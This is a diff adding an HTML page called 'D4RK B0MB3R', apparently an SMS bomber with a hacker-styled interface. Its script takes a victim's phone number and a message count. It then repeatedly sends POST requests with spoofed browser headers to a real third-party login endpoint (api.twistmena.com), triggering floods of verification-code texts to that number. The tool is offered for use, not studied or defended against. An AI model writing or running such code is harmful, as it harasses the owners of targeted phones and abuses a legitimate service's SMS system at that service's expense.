@@ -1,0 +1,857 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>D4RK B0MB3R - By Ahmed Wael</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', 'Consolas', monospace;
+        }
+
+        :root {
+            --neon-green: #0f0;
+            --neon-red: #f00;
+            --neon-blue: #0af;
+            --dark-bg: #0a0a0a;
+            --terminal-bg: #001100;
+        }
+
+        body {
+            background: var(--dark-bg);
+            color: var(--neon-green);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Matrix Background */
+        #matrix {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            opacity: 0.3;
+        }
+
+        /* Skull Animation */
+        .skull-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: -1;
+            opacity: 0.1;
+            filter: drop-shadow(0 0 20px var(--neon-green));
+        }
+
+        .skull {
+            font-size: 8rem;
+            animation: skullGlow 3s ease-in-out infinite alternate;
+        }
+
+        @keyframes skullGlow {
+            0% { 
+                text-shadow: 0 0 10px var(--neon-green), 
+                           0 0 20px var(--neon-green),
+                           0 0 30px var(--neon-green);
+                transform: rotate(0deg);
+            }
+            100% { 
+                text-shadow: 0 0 20px var(--neon-red),
+                           0 0 30px var(--neon-red),
+                           0 0 40px var(--neon-red);
+                transform: rotate(5deg);
+            }
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Header Styles */
+        .header {
+            text-align: center;
+            padding: 30px 0;
+            margin-bottom: 30px;
+            position: relative;
+            border: 2px solid var(--neon-green);
+            border-radius: 15px;
+            background: rgba(0, 20, 0, 0.3);
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.2);
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.1), transparent);
+            animation: scan 4s linear infinite;
+        }
+
+        @keyframes scan {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .main-title {
+            font-size: 4rem;
+            font-weight: bold;
+            color: transparent;
+            background: linear-gradient(45deg, var(--neon-green), var(--neon-blue), var(--neon-red));
+            -webkit-background-clip: text;
+            background-clip: text;
+            text-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
+            margin-bottom: 10px;
+            letter-spacing: 8px;
+            text-transform: uppercase;
+            animation: titleGlitch 5s infinite;
+        }
+
+        @keyframes titleGlitch {
+            0%, 100% { transform: translateX(0); }
+            10% { transform: translateX(-5px); }
+            20% { transform: translateX(5px); }
+            30% { transform: translateX(-5px); }
+            40% { transform: translateX(5px); }
+            50% { transform: translateX(0); }
+        }
+
+        .subtitle {
+            font-size: 1.3rem;
+            color: var(--neon-blue);
+            margin-bottom: 5px;
+            text-shadow: 0 0 10px var(--neon-blue);
+        }
+
+        .copyright {
+            font-size: 0.9rem;
+            color: #666;
+            margin-top: 10px;
+        }
+
+        /* Grid Layout */
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        @media (max-width: 768px) {
+            .grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Card Styles */
+        .card {
+            background: rgba(0, 20, 0, 0.3);
+            border: 1px solid var(--neon-green);
+            border-radius: 10px;
+            padding: 25px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
+            transition: all 0.3s ease;
+        }
+
+        .card:hover {
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+            transform: translateY(-5px);
+        }
+
+        .card::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--neon-green), transparent);
+        }
+
+        .card-title {
+            color: var(--neon-green);
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px var(--neon-green);
+        }
+
+        /* Input Styles */
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            color: var(--neon-green);
+            margin-bottom: 10px;
+            font-size: 1rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 15px;
+            background: rgba(0, 10, 0, 0.5);
+            border: 1px solid var(--neon-green);
+            border-radius: 5px;
+            color: var(--neon-green);
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--neon-blue);
+            box-shadow: 0 0 20px rgba(0, 170, 255, 0.3);
+        }
+
+        .input-field::placeholder {
+            color: #0a0;
+        }
+
+        /* Button Styles */
+        .btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(45deg, #0a0, #050);
+            border: 2px solid var(--neon-green);
+            border-radius: 5px;
+            color: var(--neon-green);
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 0 0 10px var(--neon-green);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn:hover {
+            background: linear-gradient(45deg, #0f0, #0a0);
+            color: #000;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
+            transform: scale(1.02);
+        }
+
+        .btn:disabled {
+            background: #222;
+            border-color: #333;
+            color: #333;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .btn::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.3), transparent);
+            transition: 0.5s;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        /* Terminal Styles */
+        .terminal {
+            background: var(--terminal-bg);
+            border: 2px solid var(--neon-green);
+            border-radius: 10px;
+            padding: 20px;
+            height: 400px;
+            overflow-y: auto;
+            position: relative;
+            box-shadow: inset 0 0 20px rgba(0, 255, 0, 0.1);
+        }
+
+        .terminal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--neon-green);
+        }
+
+        .terminal-title {
+            color: var(--neon-green);
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+
+        .terminal-controls {
+            display: flex;
+            gap: 8px;
+        }
+
+        .terminal-control {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        .terminal-close { background: #f00; }
+        .terminal-minimize { background: #ff0; }
+        .terminal-maximize { background: #0f0; }
+
+        .terminal-content {
+            font-family: 'Courier New', monospace;
+            line-height: 1.4;
+        }
+
+        .terminal-line {
+            margin-bottom: 8px;
+            animation: type 0.1s ease-in;
+        }
+
+        @keyframes type {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .terminal-prompt {
+            color: var(--neon-green);
+        }
+
+        .terminal-success {
+            color: var(--neon-green);
+            text-shadow: 0 0 5px var(--neon-green);
+        }
+
+        .terminal-error {
+            color: var(--neon-red);
+            text-shadow: 0 0 5px var(--neon-red);
+        }
+
+        .terminal-warning {
+            color: #ff0;
+            text-shadow: 0 0 5px #ff0;
+        }
+
+        .terminal-info {
+            color: var(--neon-blue);
+            text-shadow: 0 0 5px var(--neon-blue);
+        }
+
+        /* Stats Section */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .stat-box {
+            background: rgba(0, 20, 0, 0.5);
+            border: 1px solid var(--neon-green);
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .stat-box:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 255, 0, 0.2);
+        }
+
+        .stat-value {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: var(--neon-green);
+            text-shadow: 0 0 10px var(--neon-green);
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            color: var(--neon-blue);
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Hacked Message */
+        .hacked-message {
+            text-align: center;
+            padding: 30px;
+            background: rgba(255, 0, 0, 0.1);
+            border: 2px solid var(--neon-red);
+            border-radius: 10px;
+            margin-top: 20px;
+            animation: hackedPulse 2s infinite;
+        }
+
+        @keyframes hackedPulse {
+            0%, 100% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.3); }
+            50% { box-shadow: 0 0 40px rgba(255, 0, 0, 0.6); }
+        }
+
+        .hacked-title {
+            color: var(--neon-red);
+            font-size: 2rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-shadow: 0 0 20px var(--neon-red);
+        }
+
+        /* Loading Animation */
+        .loading {
+            text-align: center;
+            padding: 30px;
+            display: none;
+        }
+
+        .hacker-loader {
+            display: inline-block;
+            width: 60px;
+            height: 60px;
+            border: 3px solid rgba(0, 255, 0, 0.3);
+            border-top: 3px solid var(--neon-green);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Matrix Characters */
+        .matrix-char {
+            position: absolute;
+            color: var(--neon-green);
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            opacity: 0;
+            animation: matrixFall linear infinite;
+            text-shadow: 0 0 5px var(--neon-green);
+        }
+
+        @keyframes matrixFall {
+            0% {
+                transform: translateY(-100px);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(100vh);
+                opacity: 0;
+            }
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .main-title {
+                font-size: 2.5rem;
+                letter-spacing: 4px;
+            }
+            
+            .skull {
+                font-size: 5rem;
+            }
+            
+            .grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .terminal {
+                height: 300px;
+            }
+            
+            .stats {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 480px) {
+            .main-title {
+                font-size: 2rem;
+            }
+            
+            .skull {
+                font-size: 3rem;
+            }
+            
+            .stats {
+                grid-template-columns: 1fr;
+            }
+            
+            .card {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Matrix Background -->
+    <div id="matrix"></div>
+
+    <!-- Animated Skull -->
+    <div class="skull-container">
+        <div class="skull">💀</div>
+    </div>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="main-title">D4RK B0MB3R</div>
+            <div class="subtitle">v6.6 - BY AHMED WAEL</div>
+            <div class="copyright">© 2024 ALL RIGHTS RESERVED - PRIVATE HACKING TOOL</div>
+        </div>
+
+        <!-- Main Grid -->
+        <div class="grid">
+            <!-- Input Card -->
+            <div class="card">
+                <div class="card-title">TARGET ACQUISITION</div>
+                <div class="input-group">
+                    <label class="input-label">TARGET PHONE NUMBER</label>
+                    <input type="text" id="phone" class="input-field" placeholder="Without country code...">
+                </div>
+                <div class="input-group">
+                    <label class="input-label">MESSAGE QUANTITY</label>
+                    <input type="number" id="count" class="input-field" placeholder="Number of messages...">
+                </div>
+                <button id="startBtn" class="btn">INITIATE CYBER ATTACK</button>
+                
+                <div id="loading" class="loading">
+                    <div class="hacker-loader"></div>
+                    <div>ENGAGING DARK PROTOCOLS...</div>
+                </div>
+            </div>
+
+            <!-- Terminal Card -->
+            <div class="card">
+                <div class="terminal">
+                    <div class="terminal-header">
+                        <div class="terminal-title">D4RK TERMINAL</div>
+                        <div class="terminal-controls">
+                            <div class="terminal-control terminal-close"></div>
+                            <div class="terminal-control terminal-minimize"></div>
+                            <div class="terminal-control terminal-maximize"></div>
+                        </div>
+                    </div>
+                    <div id="terminal-content" class="terminal-content">
+                        <div class="terminal-line terminal-prompt">root@d4rk:~$ system_init</div>
+                        <div class="terminal-line terminal-info">D4RK B0MB3R v6.6 ONLINE</div>
+                        <div class="terminal-line terminal-info">Awaiting target parameters...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Results Section -->
+        <div class="card results" id="results" style="display: none;">
+            <div class="card-title">MISSION STATISTICS</div>
+            
+            <div class="stats">
+                <div class="stat-box">
+                    <div class="stat-value" id="successCount">0</div>
+                    <div class="stat-label">TARGETS HACKED</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="failedCount">0</div>
+                    <div class="stat-label">FAILED ATTEMPTS</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="totalCount">0</div>
+                    <div class="stat-label">TOTAL STRIKES</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="successRate">0%</div>
+                    <div class="stat-label">SUCCESS RATE</div>
+                </div>
+            </div>
+
+            <div id="hackedMessage" class="hacked-message" style="display: none;">
+                <div class="hacked-title">🎯 TARGET COMPROMISED!</div>
+                <div class="terminal-success">All data channels breached successfully! 🔥</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Matrix Rain Effect
+        function createMatrix() {
+            const matrix = document.getElementById('matrix');
+            const chars = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ$+-*/=%\"'#&_(),.;:?!\\|{}<>[]^~";
+            const fontSize = 16;
+            const columns = Math.floor(window.innerWidth / fontSize);
+            
+            for (let i = 0; i < columns; i++) {
+                const delay = Math.random() * 5;
+                const duration = 3 + Math.random() * 5;
+                
+                const charElement = document.createElement('div');
+                charElement.className = 'matrix-char';
+                charElement.style.left = `${i * fontSize}px`;
+                charElement.style.animationDelay = `${delay}s`;
+                charElement.style.animationDuration = `${duration}s`;
+                charElement.textContent = chars.charAt(Math.floor(Math.random() * chars.length));
+                
+                matrix.appendChild(charElement);
+            }
+        }
+
+        // Dark SMS Bomber Class
+        class DarkSMSBomber {
+            constructor() {
+                this.successCount = 0;
+                this.failedCount = 0;
+                this.totalCount = 0;
+                this.isRunning = false;
+                this.terminal = document.getElementById('terminal-content');
+                this.startBtn = document.getElementById('startBtn');
+                this.loading = document.getElementById('loading');
+                this.results = document.getElementById('results');
+                
+                this.initializeEventListeners();
+            }
+
+            initializeEventListeners() {
+                this.startBtn.addEventListener('click', () => this.startAttack());
+                
+                document.getElementById('phone').addEventListener('keypress', (e) => {
+                    if (e.key === 'Enter') this.startAttack();
+                });
+                
+                document.getElementById('count').addEventListener('keypress', (e) => {
+                    if (e.key === 'Enter') this.startAttack();
+                });
+            }
+
+            async startAttack() {
+                const phone = document.getElementById('phone').value.trim();
+                const count = parseInt(document.getElementById('count').value);
+
+                if (!this.validateInputs(phone, count)) {
+                    return;
+                }
+
+                this.isRunning = true;
+                this.resetCounters();
+                this.showLoading();
+                this.clearTerminal();
+                this.showTerminal();
+                this.hideResults();
+
+                const formattedPhone = phone.startsWith('2') ? phone : '2' + phone;
+
+                this.addTerminalLine('root@d4rk:~$ initiate_cyber_attack', 'prompt');
+                this.addTerminalLine('[SYSTEM] Initializing D4RK protocols...', 'info');
+                this.addTerminalLine(`[TARGET] Acquired: ${formattedPhone}`, 'info');
+                this.addTerminalLine(`[PAYLOAD] Deploying ${count} messages`, 'info');
+                this.addTerminalLine('[STATUS] Engaging cyber warfare...', 'warning');
+                this.addTerminalLine('', 'info');
+
+                for (let i = 0; i < count && this.isRunning; i++) {
+                    await this.sendSMS(formattedPhone, i + 1, count);
+                    this.updateStats();
+                    
+                    if (i < count - 1) {
+                        await this.delay(2000);
+                    }
+                }
+
+                this.completeAttack(formattedPhone);
+            }
+
+            validateInputs(phone, count) {
+                if (!phone) {
+                    this.showError('Target phone number required');
+                    return false;
+                }
+
+                if (!count || count <= 0) {
+                    this.showError('Valid message quantity required');
+                    return false;
+                }
+
+                if (count > 50) {
+                    this.showError('Maximum 50 messages allowed per target');
+                    return false;
+                }
+
+                return true;
+            }
+
+            async sendSMS(phone, attempt, total) {
+                try {
+                    const url = "https://api.twistmena.com/music/Dlogin/sendCode";
+                    
+                    const payload = {
+                        "dial": phone,
+                        "lang": "en"
+                    };
+
+                    const headers = {
+                        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
+                        'Accept': "application/json, text/plain, */*",
+                        'Accept-Encoding': "gzip, deflate, br, zstd",
+                        'Content-Type': "application/json",
+                        'sec-ch-ua-platform': "\"Android\"",
+                        'accept-language': "en",
+                        'sec-ch-ua': "\"Google Chrome\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"",
+                        'sec-ch-ua-mobile': "?1",
+                        'vendor_id': "TWIST_MUSIC_PORTAL",
+                        'channel': "web",
+                        'device_id': "54e34445-b915-48ce-acdd-27e7c0f7b466",
+                        'platform': "web",
+                        'origin': "https://music.twistmena.com",
+                        'sec-fetch-site': "same-site",
+                        'sec-fetch-mode': "cors",
+                        'sec-fetch-dest': "empty",
+                        'referer': "https://music.twistmena.com/",
+                        'priority': "u=1, i"
+                    };
+
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: headers,
+                        body: JSON.stringify(payload)
+                    });
+
+                    if (response.ok) {
+                        this.successCount++;
+                        this.addTerminalLine(`[${attempt.toString().padStart(2, '0')}/${total}] ☠️  TARGET HACKED - Strike ${attempt}`, 'success');
+                    } else {
+                        this.failedCount++;
+                        this.addTerminalLine(`[${attempt.toString().padStart(2, '0')}/${total}] 💀 STRIKE FAILED - Attempt ${attempt}`, 'error');
+                    }
+                    
+                    this.totalCount++;
+                    
+                } catch (error) {
+                    this.failedCount++;
+                    this.totalCount++;
+                    this.addTerminalLine(`[${attempt.toString().padStart(2, '0')}/${total}] ⚡ NETWORK ERROR - Strike ${attempt}`, 'error');
+                }
+            }
+
+            completeAttack(phone) {
+                this.isRunning = false;
+                this.hideLoading();
+                this.showResults();
+                this.showHackedMessage(phone);
+                
+                this.addTerminalLine('', 'info');
+                this.addTerminalLine('[SYSTEM] Cyber attack completed!', 'info');
+                this.addTerminalLine(`[STATS] ${this.successCount} successful | ${this.failedCount} failed`, 'info');
+                this.addTerminalLine(`[STATS] Success rate: ${(this.successCount/this.totalCount*100).toFixed(1)}%`, 'info');
+                this.addTerminalLine('root@d4rk:~$ ', 'prompt');
+            }
+
+            resetCounters() {
+                this.successCount = 0;
+                this.failedCount = 0;
+                this.totalCount = 0;
+            }
+
+            updateStats() {
+                document.getElementById('successCount').textContent = this.successCount;
+                document.getElementById('failedCount').textContent = this.failedCount;
+                document.getElementById('totalCount').textContent = this.totalCount;
+                
+                const successRate = this.totalCount > 0 ? (this.successCount / this.totalCount * 100).toFixed(1) : 0;
+                document.getElementById('successRate').textContent = successRate + '%';
+            }
+
+            showLoading() {
+                this.loading.style.display = 'block';
+                this.startBtn.disabled = true;
+                this.startBtn.textContent = 'CYBER ATTACK IN PROGRESS...';
+            }
+
+            hideLoading() {
+                this.loading.style.display = 'none';
+                this.startBtn.disabled = false;
+                this.startBtn.textContent = 'INITIATE CYBER ATTACK';
+            }
+
+            clearTerminal() {
+                this.terminal.innerHTML = '';
+            }
+
+            showTerminal() {
+                // Terminal is always visible
+            }
+
+            showResults() {
+                this.results.style.display = 'block';
+            }
+
+            hideResults() {
+                this.results.style.display = 'none';
+            }
+
+            showHackedMessage(phone) {
+                const hackedMessage = document.getElementById('hackedMessage');
+                hackedMessage.style.display = 'block';
+            }
+
+            addTerminalLine(text, type = 'info') {
+                const line = document.createElement('div');
+                line.className = `terminal-line terminal-${type}`;
+                
+                if (type === 'prompt') {
+                    line.innerHTML = `<span class="terminal-prompt">${text}</span>`;
+                } else {
+                    line.textContent = text;
+                }
+                
+                this.terminal.appendChild(line);
+                this.terminal.scrollTop = this.terminal.scrollHeight;
+            }
+
+            showError(message) {
+                this.addTerminalLine(`[ERROR] ${message}`, 'error');
+            }
+
+            delay(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+        }
+
+        // Initialize the application
+        document.addEventListener('DOMContentLoaded', () => {
+            createMatrix();
+            new DarkSMSBomber();
+            
+            // Recreate matrix on resize
+            window.addEventListener('resize', () => {
+                document.getElementById('matrix').innerHTML = '';
+                createMatrix();
+            });
+        });
+    </script>
+</body>
+</html>
